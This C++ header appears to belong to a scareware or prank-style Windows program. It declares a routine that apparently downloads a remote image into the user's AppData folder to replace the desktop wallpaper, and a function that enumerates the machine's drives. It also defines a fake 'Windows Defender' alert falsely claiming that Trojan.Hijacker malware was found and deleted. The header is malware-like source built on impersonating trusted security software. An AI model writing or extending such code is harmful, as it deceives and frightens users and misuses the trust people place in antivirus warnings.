#pragma once
#include <vector>

#define MAX_PATH 260

char* user = std::getenv("username");
std::wstring computername(&user[0], &user[strlen(user)]);
std::wstring concatwstring = L"C:\\Users\\" + computername + L"\\AppData\\Roaming\\win.jpg";
const wchar_t* pathappdata = concatwstring.c_str();
namespace utils
{
	class Background
	{
	protected:
		LPCWSTR BGURL = L"https://i.ibb.co/Zm1vdSV/mac.png";
		LPCWSTR BGPATH = (pathappdata);
	public:
		void ch_process(const wchar_t* background);
		int ch_proceed(void);
	};

	class ListDrives
	{
	protected:

	public:
		std::vector<std::string> getListOfDrives() {
			std::vector<std::string> arrayOfDrives;
			char* szDrives = new char[MAX_PATH]();
			if (GetLogicalDriveStringsA(MAX_PATH, szDrives))
			for (int i = 0; i < 100; i += 4)
				if (szDrives[i] != (char)0)
					arrayOfDrives.push_back(std::string{ szDrives[i],szDrives[i + 1],szDrives[i + 2] });
			delete[] szDrives;
			return arrayOfDrives;
		}
	};

	class ErrorCode
	{
	private:
		const char * message = "Windows Defender deleted this file from your computer, Trojan.Hijacker malware was detected.";
		const char * title = "Windows Defender";
	public:
		void show_error(void);
	};
}